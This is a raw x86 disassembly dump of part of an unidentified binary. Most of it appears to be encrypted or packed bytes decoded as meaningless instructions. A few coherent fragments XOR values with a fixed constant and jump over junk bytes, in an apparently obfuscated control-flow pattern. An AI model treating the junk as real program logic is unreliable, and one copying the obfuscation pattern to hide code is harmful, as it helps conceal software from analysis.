  415063:	scas   al,BYTE PTR es:[edi]
  415064:	and    al,0x69
  415066:	and    eax,DWORD PTR [ebp+0x6e]
  415069:	adc    DWORD PTR [edi-0x65],ebp
  41506c:	js     0x4150c8
  41506e:	scas   eax,DWORD PTR es:[edi]
  41506f:	dec    ebx
  415070:	in     eax,dx
  415071:	fnstcw WORD PTR [edi-0x12]
  415074:	adc    BYTE PTR [ebp+0x3d],bl
  415077:	xchg   edi,eax
  415078:	lds    ecx,FWORD PTR [edx+esi*4+0x35d0cfa8]
  41507f:	(bad)  
  415080:	jmp    0xe96a:0x924a0935
  415087:	dec    ebx
  415088:	pop    ebx
  415089:	imul   esp,DWORD PTR [edx],0xffffffe2
  41508c:	add    dh,ch
  41508e:	js     0x41501a
  415090:	div    BYTE PTR [ecx-0x256495b9]
  415096:	dec    ax
  415098:	sub    ecx,DWORD PTR [edx+eax*8+0x52]
  41509c:	adc    ecx,DWORD PTR [ecx+ebx*8+0x5c654d7b]
  4150a3:	ja     0x415124
  4150a5:	ret    
  4150a6:	stc    
  4150a7:	xor    esi,esp
  4150a9:	or     eax,0x3e120bf2
  4150ae:	js     0x415114
  4150b0:	in     eax,0xb0
  4150b2:	and    esi,esi
  4150b4:	push   edx
  4150b5:	leave  
  4150b6:	les    esp,FWORD PTR [ecx+0x3baa4cda]
  4150bc:	sbb    cl,BYTE PTR [esi-0x76]
  4150bf:	popf   
  4150c0:	push   ss
  4150c1:	mov    ah,0x19
  4150c3:	mov    dl,0xce
  4150c5:	loopne 0x415119
  4150c7:	jae    0x415113
  4150c9:	xor    BYTE PTR [ecx+0x56],ah
  4150cc:	lods   al,BYTE PTR ds:[esi]
  4150cd:	push   eax
  4150ce:	mov    al,0x5c
  4150d0:	cmp    eax,0x1ca9ecb9
  4150d5:	jns    0x4150f7
  4150d7:	cmp    ah,bh
  4150d9:	push   esi
  4150da:	mov    eax,0x5449b8e1
  4150df:	ret    0x2c9a
  4150e2:	sub    esi,ebx
  4150e4:	loop   0x41508c
  4150e6:	dec    edx
  4150e7:	or     DWORD PTR [esi],edi
  4150e9:	pop    esi
  4150ea:	cwde   
  4150eb:	push   cs
  4150ec:	int3   
  4150ed:	retf   
  4150ee:	sub    DWORD PTR [edi-0x156c931],ecx
  4150f4:	pop    ds
  4150f5:	call   0x5d19:0x8466f6f5
  4150fc:	adc    BYTE PTR [edx+0x2],0x6b
  415100:	dec    ebp
  415101:	mov    bh,BYTE PTR [esp+eiz*8+0x76469a18]
  415108:	mov    al,ds:0x46969f0c
  41510d:	pop    esi
  41510e:	or     BYTE PTR [eax-0x1499b465],bl
  415114:	adc    DWORD PTR [ebx+0x67],ebp
  415117:	jmp    FWORD PTR ds:0xdbb1002f
  41511d:	ins    BYTE PTR es:[edi],dx
  41511e:	jno    0x41516f
  415120:	lods   al,BYTE PTR ds:[esi]
  415121:	jnp    0x4150c8
  415123:	ja     0x4150c8
  415125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415126:	or     al,cl
  415128:	jg     0x415151
  41512a:	(bad)  
  41512b:	fincstp 
  41512d:	fcomip st,st(1)
  41512f:	or     bh,BYTE PTR [ecx]
  415131:	out    dx,eax
  415132:	or     eax,0x1cf93fec
  415137:	(bad)  
  415138:	xchg   edx,eax
  415139:	mov    dh,0x52
  41513b:	push   eax
  41513c:	call   0xccb2:0xa62cf6c
  415143:	dec    esp
  415144:	imul   ebp,DWORD PTR [ebp+0x5d],0x85ae6da0
  41514b:	sti    
  41514c:	jp     0x41518e
  41514e:	in     eax,dx
  41514f:	dec    ebx
  415150:	aas    
  415151:	pop    ds
  415152:	push   ss
  415153:	adc    DWORD PTR [ecx+eiz*8-0x52b055b4],ecx
  41515a:	cmp    BYTE PTR [ebp-0x595abe6f],bl
  415160:	retf   
  415161:	cld    
  415162:	scas   al,BYTE PTR es:[di]
  415164:	ja     0x415162
  415166:	test   eax,0xb10bffe4
  41516b:	jle    0x4151af
  41516d:	xchg   edi,eax
  41516e:	xor    DWORD PTR [esi],ebp
  415170:	in     al,0xf9
  415172:	mov    ds:0xa0a79e68,al
  415177:	pop    ebx
  415178:	sbb    eax,0x193f82e9
  41517d:	inc    ebp
  41517e:	retf   0xe02b
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	(bad)  
  4151a5:	xchg   ebp,eax
  4151a6:	sub    al,ah
  4151a8:	in     eax,dx
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	(bad)  
  4151b2:	xchg   ebx,eax
  4151b3:	addr16 sub edx,esp
  4151b6:	ins    DWORD PTR es:[edi],dx
  4151b7:	jg     0x415203
  4151b9:	or     ah,BYTE PTR ss:[ebp-0x99fc4d4]
  4151c0:	adc    BYTE PTR [esi+0x551bb7ad],0xcd
  4151c7:	mov    eax,0x3aa7a7cc
  4151cc:	int3   
  4151cd:	inc    edx
  4151ce:	sbb    bl,BYTE PTR [ecx]
  4151d0:	push   eax
  4151d1:	sbb    ebx,edi
  4151d3:	cdq    
  4151d4:	outs   dx,BYTE PTR ds:[si]
  4151d6:	ret    0x67fa
  4151d9:	jne    0x4151fb
  4151db:	pop    esi
  4151dc:	mov    al,ds:0x35f11663
  4151e1:	jmp    0x415220
  4151e3:	mov    ds:0xadcb4a9a,eax
  4151e8:	sub    BYTE PTR [edx],0x4c
  4151eb:	and    eax,DWORD PTR [esi]
  4151ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ee:	mov    esi,0x248570d7
  4151f3:	sub    bl,BYTE PTR [edx]
  4151f5:	ins    WORD PTR es:[edi],dx
  4151f7:	push   0x21
  4151f9:	jo     0x415217
  4151fb:	shl    dl,1
  4151fd:	or     DWORD PTR [ecx-0x4],esi
  415200:	jb     0x41523b
  415202:	xor    DWORD PTR [ebx],0xce7901c9
  415208:	cmp    bh,dh
  41520a:	imul   eax,DWORD PTR [ebx+0x39b36c67],0x77c6713c
  415214:	icebp  
  415215:	xor    al,0x20
  415217:	cmp    edi,ebp
  415219:	mov    ebp,0xdfa88d96
  41521e:	inc    ecx
  41521f:	in     eax,dx
  415220:	dec    esp
  415221:	fs icebp 
  415223:	and    edi,edi
  415225:	repz mov edi,0x824f451
  41522b:	mov    edx,0x6be6e147
  415230:	jbe    0x41520e
  415232:	or     eax,0x6c42f0f0
  415237:	loop   0x415267
  415239:	mov    bl,0x3b
  41523b:	inc    esi
  41523c:	xchg   edx,eax
  41523d:	imul   ebx,edx,0x48
  415240:	adc    al,0xbe
  415242:	xor    BYTE PTR fs:[ecx+eax*1],0x95
  415247:	addr16 jno 0x415224
  41524a:	jecxz  0x41526a
  41524c:	cdq    
  41524d:	std    
  41524e:	jmp    0x265c:0x7c27c5e8
  415255:	jl     0x415266
  415257:	cmp    DWORD PTR [eax+0x14],ecx
  41525a:	pop    edi
  41525b:	out    0xe6,eax
  41525d:	xchg   edx,eax
  41525e:	pushf  
  41525f:	clc    
  415260:	xor    eax,0x7ad9694a
  415265:	sbb    al,0x55
  415267:	jg     0x4152e5
  415269:	dec    ebx
  41526a:	mov    al,0x36
  41526c:	push   ds
  41526d:	mov    dh,0x51
  41526f:	fxch   st(6)
  415271:	test   BYTE PTR [eax+0x9cad9e5],dh
  415277:	add    eax,0x6a6747fe
  41527c:	cs aam 0xb2
  41527f:	fnstenv ss:[esi-0x73314ac9]
  415286:	jno    0x41522e
  415288:	add    al,0x43
  41528a:	je     0x4152e8
  41528c:	aaa    
  41528d:	cmp    BYTE PTR [ebp+0x422cb5ef],dh
  415293:	jle    0x41527e
  415295:	xchg   esp,eax
  415296:	gs ja  0x41522f
  415299:	xchg   edi,eax
  41529a:	iret   
  41529b:	jmp    0x2e3e99c1
  4152a0:	xor    ebp,esi
  4152a2:	xchg   BYTE PTR [ebx-0x196e3dca],cl
  4152a8:	xchg   edi,eax
  4152a9:	xchg   edi,eax
  4152aa:	shr    BYTE PTR ds:0x7f06c5b0,cl
  4152b0:	sbb    al,0x42
  4152b2:	mov    ds:0x197f7d87,eax
  4152b7:	lock jmp 0x4152a1
  4152ba:	mov    al,BYTE PTR [ebx-0x26a5c9d7]
  4152c0:	push   ds
  4152c1:	ror    BYTE PTR [esi+0x50],cl
  4152c4:	jl     0x415323
  4152c6:	xor    BYTE PTR [ecx],cl
  4152c8:	cmp    DWORD PTR [edi+eax*4-0x4d],esp
  4152cc:	mov    DWORD PTR [edi-0x1e],edx
  4152cf:	dec    ecx
  4152d0:	xchg   ebp,eax
  4152d1:	sbb    al,0xf7
  4152d3:	mov    dl,BYTE PTR [edi+0x3458ffb0]
  4152d9:	out    0xfd,eax
  4152db:	adc    DWORD PTR [ebx+0x2ab45367],0xffffffc4
  4152e2:	aaa    
  4152e3:	xor    eax,0xd76bee60
  4152e8:	fxch   st(6)
  4152ea:	rcl    DWORD PTR [eax+0x7af3ea3a],0xcd
  4152f1:	cmp    bh,cl
  4152f3:	dec    esp
  4152f4:	and    al,0xe4
  4152f6:	imul   edi,edi,0x8c23cbaa
  4152fc:	rcr    DWORD PTR [edx],cl
  4152fe:	sub    eax,0x43ceeab4
  415303:	aaa    
  415304:	shl    DWORD PTR [edx+edx*4],cl
  415307:	xchg   ebp,eax
  415308:	cmp    BYTE PTR [edx+0x68],0x1b
  41530c:	cdq    
  41530d:	jmp    0x415388
  41530f:	stos   DWORD PTR es:[edi],eax
  415310:	xchg   ecx,eax
  415311:	xor    eax,0xad3b443
  415316:	mov    edi,DWORD PTR [edi]
  415318:	pop    es
  415319:	ret    0x432b
  41531c:	xor    BYTE PTR [ecx+0x7022e011],0x10
  415323:	and    ebp,DWORD PTR [ebp-0x74ffeffd]
  415329:	clc    
  41532a:	pop    ds
  41532b:	cmc    
  41532c:	in     al,dx
  41532d:	push   edx
  41532e:	sbb    edx,DWORD PTR [ebx-0x21]
  415331:	or     al,al
  415333:	aaa    
  415334:	inc    edi
  415335:	jb     0x415305
  415337:	fadd   DWORD PTR [esi+0x2c069ffd]
  41533d:	ja     0x41534f
  41533f:	test   BYTE PTR [ecx+0x3d],dh
  415342:	sub    ebp,DWORD PTR [edi+esi*8-0x6eaee695]
  415349:	aaa    
  41534a:	enter  0xca6f,0x2b
  41534e:	popa   
  41534f:	call   0x2f4c:0x3efd0339
  415356:	mov    al,ds:0x5dee5bb7
  41535b:	lock add cl,al
  41535e:	fwait
  41535f:	in     eax,0xd1
  415361:	and    BYTE PTR [ecx],dh
  415363:	pop    ss
  415364:	fld    QWORD PTR [ecx]
  415366:	(bad)  
  415367:	stos   DWORD PTR es:[edi],eax
  415368:	sbb    eax,0xbb8e1865
  41536d:	int    0x68
  41536f:	popa   
  415370:	hlt    
  415371:	int3   
  415372:	xor    cl,0x2f
  415375:	mov    DWORD PTR [edi+0x27560c1b],ebx
  41537b:	in     eax,0x7
  41537d:	and    DWORD PTR [edx-0x5],0xffffffed
  415381:	lock imul eax,DWORD PTR [ecx-0x6ca082e5],0xffffffc4
  415389:	cmp    DWORD PTR [eax],esp
  41538b:	dec    esp
  41538c:	and    BYTE PTR [ecx],al
  41538e:	cli    
  41538f:	out    0xcc,al
  415391:	push   ecx
  415392:	add    esp,DWORD PTR [edx+ebp*2-0x54773e74]
  415399:	sti    
  41539a:	pop    edi
  41539b:	setge  BYTE PTR [ecx+0x12]
  41539f:	mov    edx,0x7a87280b
  4153a4:	scas   eax,DWORD PTR es:[edi]
  4153a5:	int3   
  4153a6:	jnp    0x41536c
  4153a8:	int    0xcc
  4153aa:	je     0x415395
  4153ac:	loopne 0x415395
  4153ae:	or     BYTE PTR [ebx],0x9f
  4153b1:	push   es
  4153b2:	sub    al,0x4c
  4153b4:	fs sub esi,edx
  4153b7:	inc    edi
  4153b8:	mov    bl,0xf0
  4153ba:	hlt    
  4153bb:	pop    ebp
  4153bc:	mov    al,0xc1
  4153be:	scas   eax,DWORD PTR es:[edi]
  4153bf:	retf   0xe343
  4153c2:	cli    
  4153c3:	sub    ebp,edi
  4153c5:	mov    bh,0xf5
  4153c7:	xor    al,0x4e
  4153c9:	xchg   ebp,eax
  4153ca:	jns    0x415433
  4153cc:	xchg   esi,eax
  4153cd:	test   al,0xab
  4153cf:	push   esi
  4153d0:	jb     0x415360
  4153d2:	inc    ebp
  4153d3:	inc    edx
  4153d4:	(bad)
  4153d8:	add    eax,0xf8fd7104
  4153dd:	cmc    
  4153de:	(bad)  
  4153df:	jge    0x415379
  4153e1:	push   esp
  4153e2:	retf   
  4153e3:	outs   dx,BYTE PTR ds:[esi]
  4153e4:	jge    0x415391
  4153e6:	dec    ecx
  4153e7:	repz push es
  4153e9:	lods   al,BYTE PTR ds:[esi]
  4153ea:	outs   dx,DWORD PTR ds:[esi]
  4153eb:	sbb    al,0x2c
  4153ed:	leave  
  4153ee:	dec    ebx
  4153ef:	imul   edx,DWORD PTR [eax+0x414f90d],0x45c59980
  4153f9:	imul   eax,DWORD PTR [edx],0xaa2b285b
  4153ff:	dec    BYTE PTR [eax+0x70]
  415402:	lea    eax,[esi+ebp*1+0x35490bfc]
  415409:	pop    ebp
  41540a:	int    0x22
  41540c:	in     al,dx
  41540d:	ja     0x4153f4
  41540f:	rol    BYTE PTR [esi+0x13de7143],1
  415415:	arpl   bx,dx
  415417:	popa   
  415418:	loope  0x4153e4
  41541a:	push   ecx
  41541b:	ja     0x4153c5
  41541d:	push   esi
  41541e:	scas   al,BYTE PTR es:[edi]
  41541f:	mov    esp,DWORD PTR [edx]
  415421:	dec    ebx
  415422:	pushf  
  415423:	ror    BYTE PTR [ebx+0x41],1
  415426:	pop    ds
  415427:	and    al,0xe4
  415429:	add    eax,0x343c2bb8
  41542e:	mov    bl,0xd7
  415430:	xchg   esp,eax
  415431:	fmul   DWORD PTR [edi-0x202b2422]
  415437:	push   esi
  415438:	cmc    
  415439:	cdq    
  41543a:	add    dl,BYTE PTR [esp+edx*8-0x7cf89854]
  415441:	loopne 0x41546f
  415443:	cmp    eax,0xdfc34393
  415448:	jmp    0xd4a1a000
  41544d:	(bad)  
  41544e:	popf   
  41544f:	scas   eax,DWORD PTR es:[edi]
  415450:	and    dh,BYTE PTR [esi-0x1094dd0a]
  415456:	push   es
  415457:	aaa    
  415458:	sbb    eax,0x1b3191e8
  41545d:	sub    DWORD PTR [edx+0x8],esp
  415460:	neg    BYTE PTR [ebx+0x7c796093]
  415466:	aas    
  415467:	xchg   edi,eax
  415468:	mov    edi,0xbc2af843
  41546d:	cli    
  41546e:	sub    BYTE PTR [esi-0x4d44f23b],0x47
  415475:	push   edx
  415476:	mov    ah,0x3
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0xb2
  4154c8:	fistp  DWORD PTR [esi+0x3c]
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0xb870707e
  4154d4:	sub    eax,0xb5bd5991
  4154da:	les    esp,FWORD PTR [eax+esi*2]
  4154dd:	loopne 0x4154d5
  4154df:	jo     0x415482
  4154e1:	mov    ecx,0x8c99987a
  4154e6:	sbb    dh,BYTE PTR [ebx+0x59061e4e]
  4154ec:	xor    eax,0x24ac6888
  4154f1:	jo     0x41551c
  4154f3:	rcr    BYTE PTR [edi+edx*2+0x29],0x65
  4154f8:	pop    es
  4154f9:	leave  
  4154fa:	xchg   esi,eax
  4154fb:	out    dx,eax
  4154fc:	and    BYTE PTR [ebx+0x50],0x78
  415500:	out    dx,eax
  415501:	scas   eax,DWORD PTR es:[di]
  415503:	das    
  415504:	pop    esp
  415505:	push   esp
  415506:	push   cs
  415507:	pusha  
  415508:	sbb    eax,0x314d7525
  41550d:	inc    edx
  41550e:	scas   al,BYTE PTR es:[edi]
  41550f:	sub    BYTE PTR [edx-0x44],cl
  415512:	dec    ecx
  415513:	loop   0x4154d5
  415515:	add    BYTE PTR [ebx-0x71],ch
  415518:	ins    DWORD PTR es:[edi],dx
  415519:	call   0xed301c50
  41551e:	fmul   st,st(2)
  415520:	iret   
  415521:	mov    dh,0x1a
  415523:	pop    edi
  415524:	icebp  
  415525:	adc    BYTE PTR [esi],0x5f
  415528:	hlt    
  415529:	fmul   QWORD PTR [ebp+0x2c]
  41552c:	mov    cl,0xe5
  41552e:	out    dx,al
  41552f:	dec    ecx
  415530:	jae    0x4154d8
  415532:	(bad)  
  415533:	inc    ebp
  415534:	test   BYTE PTR ds:0x89b4baf,dl
  41553a:	aad    0x61
  41553c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41553d:	xor    BYTE PTR ds:0xfaf33da2,bh
  415543:	push   esi
  415544:	push   edi
  415545:	xor    DWORD PTR [ebx+0x36a72aab],esp
  41554b:	loopne 0x4154e8
  41554d:	push   edi
  41554e:	jp     0x415523
  415550:	mov    al,0x4d
  415552:	rcr    DWORD PTR [ebx],0x2c
  415555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415556:	aas    
  415557:	(bad)  
  415559:	mov    ebx,0xe88b6011
  41555e:	ins    BYTE PTR es:[edi],dx
  41555f:	push   0xffffffc0
  415561:	lahf   
  415562:	mov    bh,0x4
  415564:	adc    ecx,DWORD PTR [edi-0x55]
  415567:	mov    ds:0xde2dd9f5,al
  41556c:	xchg   esp,eax
  41556d:	mov    BYTE PTR [edx],0x45
  415570:	xlat   BYTE PTR ds:[ebx]
  415571:	push   ebp
  415572:	dec    esi
  415573:	push   0x63
  415575:	add    BYTE PTR [edi+0x47],0xa8
  415579:	dec    esp
  41557a:	dec    esi
  41557b:	mov    esi,0xcdb72a05
  415580:	adc    ebp,ebp
  415582:	mov    bh,0xc6
  415584:	popa   
  415585:	imul   ecx,DWORD PTR [ecx+edx*1-0x72b5afed],0x5dbf3556
  415590:	xchg   ebp,eax
  415591:	push   esp
  415592:	add    BYTE PTR [esi],ch
  415594:	ja     0x415602
  415596:	jmp    0x79b5:0x8ef715bb
  41559d:	cwde   
  41559e:	stc    
  41559f:	or     DWORD PTR [ebx-0xbf58ece],edi
  4155a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a6:	fistp  DWORD PTR [ebx]
  4155a8:	repz fs test eax,0x456ef404
  4155af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155b0:	mov    ebx,DWORD PTR [eax]
  4155b2:	xor    DWORD PTR ds:0xebbdf131,eax
  4155b8:	pop    ecx
  4155b9:	xchg   ebx,eax
  4155ba:	(bad)  
  4155bb:	int    0x3b
  4155bd:	rcr    dh,0x6f
  4155c0:	pop    eax
  4155c1:	dec    edx
  4155c2:	out    0x87,eax
  4155c4:	loope  0x4155ee
  4155c6:	jle    0x41563e
  4155c8:	test   eax,0x866074fc
  4155ce:	popf   
  4155cf:	test   bl,ah
  4155d1:	scas   eax,DWORD PTR es:[edi]
  4155d2:	push   ss
  4155d3:	bound  esp,QWORD PTR [edx-0x3853f944]
  4155d9:	(bad)  
  4155da:	out    dx,eax
  4155db:	jg     0x415601
  4155dd:	mov    ebx,0x6850c29f
  4155e2:	stos   BYTE PTR es:[edi],al
  4155e3:	pop    ecx
  4155e4:	nop
  4155e5:	sub    BYTE PTR [ecx+0x58432a0],bl
  4155eb:	fstp   DWORD PTR [edi]
  4155ed:	daa    
  4155ee:	adc    al,0xf8
  4155f0:	(bad)  
  4155f1:	ror    BYTE PTR [edx-0x5c],cl
  4155f4:	es das 
  4155f6:	pop    ds
  4155f7:	and    bl,BYTE PTR [esp+ebx*8-0x5d]
  4155fb:	test   ebp,esp
  4155fd:	out    0x45,al
  4155ff:	mov    ebx,0x7b2007e9
  415604:	aaa    
  415605:	xchg   esi,eax
  415606:	add    al,bh
  415608:	stos   DWORD PTR es:[di],eax
  41560a:	loop   0x415689
  41560c:	inc    esp
  41560d:	pop    ss
  41560e:	mov    cl,0xd5
  415610:	or     BYTE PTR [ecx],ah
  415612:	mov    ecx,DWORD PTR [ecx+0x434c917a]
  415618:	jmp    0x415618
  41561a:	push   DWORD PTR [eax+0x7d0d93dd]
  415620:	cmc    
  415621:	(bad)  
  415622:	fdiv   QWORD PTR [esi-0x1d]
  415625:	adc    esp,esp
  415627:	sahf   
  415628:	xchg   ebx,eax
  415629:	loop   0x41565c
  41562b:	fsub   DWORD PTR [ebp+0x3b]
  41562e:	jno    0x4155e0
  415630:	icebp  
  415631:	cli    
  415632:	and    ch,BYTE PTR [edi+0x51]
  415635:	fadd   QWORD PTR [ecx-0x3]
  415638:	mov    dl,0xd3
  41563a:	add    eax,0x8254aa2
  41563f:	call   0x1631:0x2e09b43
  415646:	mov    DWORD PTR [edi],esp
  415648:	int    0xe6
  41564a:	mov    ds:0x32786edd,al
  41564f:	lods   eax,DWORD PTR ds:[esi]
  415650:	pop    ebp
  415651:	push   0xffffffe3
  415653:	imul   edi,DWORD PTR [edi],0xa4cf2973
  415659:	xchg   esi,eax
  41565a:	push   esi
  41565b:	jnp    0x4156b3
  41565d:	cs xor al,0x2d
  415660:	push   ebx
  415661:	mov    WORD PTR [edx-0x73],ds
  415664:	shl    DWORD PTR [eax+eax*4-0x67],1
  415668:	jnp    0x415622
  41566a:	adc    al,0xb0
  41566c:	int    0xeb
  41566e:	and    DWORD PTR [eax-0x7ad018b1],ecx
  415674:	jb     0x4156b9
  415676:	in     eax,dx
  415677:	cmp    al,0xaf
  415679:	jbe    0x4156f2
  41567b:	pop    edx
  41567c:	mov    ch,0x3
  41567e:	or     dh,BYTE PTR [edx+0x1779406f]
  415684:	push   0xd8f5be76
  415689:	xchg   esp,eax
  41568a:	and    eax,0x991eb2e3
  41568f:	fiadd  WORD PTR [ecx+0x511be63a]
  415695:	fcom   QWORD PTR [ebp-0x7cd6649d]
  41569b:	fnstcw WORD PTR [esi+0xc]
  41569e:	xor    al,0x22
  4156a0:	pushf  
  4156a1:	cmp    ebx,DWORD PTR [eax-0x49]
  4156a4:	mov    ecx,0xdddd3a12
  4156a9:	lock dec ecx
  4156ab:	jl     0x41565b
  4156ad:	mov    edx,esp
  4156af:	inc    BYTE PTR [esi+edi*2+0x78]
  4156b3:	repz cmc 
  4156b5:	xor    edi,ebx
  4156b7:	sbb    al,0x90
  4156b9:	mov    bl,BYTE PTR [esi]
  4156bb:	xor    esp,DWORD PTR [eax-0x19]
  4156be:	int3   
  4156bf:	int3   
  4156c0:	push   0x4407ef1a
  4156c5:	aam    0xa2
  4156c7:	imul   esp,DWORD PTR [eax+edi*4+0x2d],0xf0551d7f
  4156cf:	adc    ebp,esi
  4156d1:	sub    bh,BYTE PTR [ebp+0x68]
  4156d4:	xor    al,0xdf
  4156d6:	sbb    esi,ecx
  4156d8:	push   ecx
  4156d9:	(bad)  
  4156da:	stos   DWORD PTR es:[edi],eax
  4156db:	jne    0x4156bf
  4156dd:	int3   
  4156de:	push   ebx
  4156df:	stos   BYTE PTR es:[edi],al
  4156e0:	std    
  4156e1:	retf   
  4156e2:	xor    eax,0xcf99b884
  4156e7:	clc    
  4156e8:	cmp    DWORD PTR [esi+0x4e],edx
  4156eb:	sub    BYTE PTR ds:0x3ff3e960,bh
  4156f1:	ds pop esp
  4156f3:	iret   
  4156f4:	(bad)  
  4156f6:	and    eax,0xa8610a58
  4156fb:	xor    ah,ch
  4156fd:	sbb    eax,0x74d31f44
  415702:	sub    al,0xd9
  415704:	inc    edi
  415705:	adc    BYTE PTR [edi-0x49],0x59
  415709:	call   0xbe16:0x69ec1b3
  415710:	dec    edi
  415711:	mov    edi,0x1b647813
  415716:	push   cs
  415717:	sub    al,0xc1
  415719:	adc    DWORD PTR [edx+0x2adbca2],0xb2f68c0b
  415723:	sub    BYTE PTR [eax],dh
  415725:	add    BYTE PTR [ecx],bh
  415727:	popf   
  415728:	gs rcl ch,0xaf
  41572c:	call   0x77f787f7
  415731:	and    eax,0x45229662
  415736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415737:	dec    ebp
  415738:	mov    WORD PTR [ebp-0x6fc6da37],gs
  41573e:	mov    al,ds:0x779d648d
  415743:	add    al,0xdf
  415745:	inc    ecx
  415746:	loop   0x415729
  415748:	jo     0x415748
  41574a:	mov    edi,0x906a2542
  41574f:	addr16 adc eax,0xfcd86cae
  415755:	xchg   BYTE PTR [ebx+esi*1],dl
  415758:	into   
  415759:	(bad)  
  41575a:	rcl    DWORD PTR [eax-0x5d1db083],1
  415760:	pop    ds
  415761:	push   es
  415762:	lea    edx,[esi-0x35]
  415765:	cmp    edx,DWORD PTR ds:0x115024e8
  41576b:	add    cl,BYTE PTR [ebx]
  41576d:	cdq    
  41576e:	adc    bl,bh
  415770:	mov    WORD PTR [ebp-0x71],es
  415773:	mov    dl,0x29
  415775:	pop    ss
  415776:	pop    ebp
  415777:	sbb    al,0xfc
  415779:	sbb    al,0xd9
  41577b:	and    al,0x6b
  41577d:	js     0x4157f3
  41577f:	not    BYTE PTR [ebp+0x36890708]
  415785:	cmp    BYTE PTR [ebp-0x61],0xd3
  415789:	adc    dl,BYTE PTR es:[ecx+0x44a2644]
  415790:	and    eax,0xedd348a3
  415795:	stc    
  415796:	je     0x415814
  415798:	stc    
  415799:	cmp    al,0xbe
  41579b:	pushf  
  41579c:	jb     0x4157d0
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   dl,cl
  4157b8:	adc    bl,BYTE PTR [ecx-0x3b]
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0x3870707e
  4157c4:	xor    esp,ebx
  4157c6:	push   ebx
  4157c7:	stos   BYTE PTR es:[edi],al
  4157c8:	and    edi,esi
  4157ca:	mov    eax,ds:0x9a7704d8
  4157cf:	mov    edi,0x6604c0b0
  4157d4:	daa    
  4157d5:	data16 jbe 0x415779
  4157d8:	(bad)  
  4157d9:	repz sbb bl,BYTE PTR [ebp+0x12ceae1f]
  4157e0:	clc    
  4157e1:	mov    eax,ds:0x325950b4
  4157e6:	jae    0x41584b
  4157e8:	adc    ah,ah
  4157ea:	and    esi,DWORD PTR [esi]
  4157ec:	push   0x52
  4157ee:	lock xchg ecx,eax
  4157f0:	push   ds
  4157f1:	test   ebp,ebp
  4157f3:	fwait
  4157f4:	pop    ecx
  4157f5:	xor    esi,DWORD PTR cs:[edx+ebp*2-0x70]
  4157fa:	(bad)  
  4157fb:	jle    0x4157f7
  4157fd:	sub    BYTE PTR [eax+0x44abb89c],ah
  415803:	mov    dl,0x15
  415805:	mov    dh,0x1a
  415807:	aas    
  415808:	and    eax,0x61fbc3b6
  41580d:	mov    ebx,edi
  41580f:	dec    esp
  415810:	and    edx,DWORD PTR [eax+0x392db7a8]
  415816:	pop    esi
  415817:	dec    ecx
  415818:	or     ah,ch
  41581a:	mov    al,ds:0x489778b
  41581f:	call   0x6051:0x29416465
  415826:	pop    ecx
  415827:	and    al,0x93
  415829:	mov    ch,bl
  41582b:	lods   eax,DWORD PTR ds:[esi]
  41582c:	push   eax
  41582d:	in     eax,dx
  41582e:	push   0x76
  415830:	jmp    0x415871
  415832:	sub    dl,ah
  415834:	xor    dl,BYTE PTR [edi+0x2e8c4d17]
  41583a:	xor    eax,0x7400ec18
  41583f:	sbb    DWORD PTR [esi],ebx
  415841:	popf   
  415842:	pop    ebp
  415843:	mov    ch,bh
  415845:	addr16 mov esi,0x8a474305
  41584b:	repnz mov edx,0x93c4da5e
  415851:	adc    ah,BYTE PTR [edi]
  415853:	jb     0x415833
  415855:	and    dl,BYTE PTR [edi+eiz*8+0xf396db3]
  41585c:	nop
  41585d:	mov    ah,0x50
  41585f:	jne    0x415810
  415861:	xor    DWORD PTR [ebx+0x29],ebx
  415864:	dec    edx
  415865:	aad    0x75
  415867:	jno    0x4158c5
  415869:	lods   al,BYTE PTR ds:[esi]
  41586a:	and    al,0xe9
  41586c:	inc    DWORD PTR [ebx+0x47fbd6b4]
  415872:	(bad)  ds:0x2a0eeed1
  415878:	das    
  415879:	popa   
  41587a:	sub    DWORD PTR [esi-0x6c],eax
  41587d:	test   eax,0xd1b101e2
  415882:	jle    0x415873
  415884:	int3   
  415885:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  415887:	add    al,BYTE PTR [ebx]
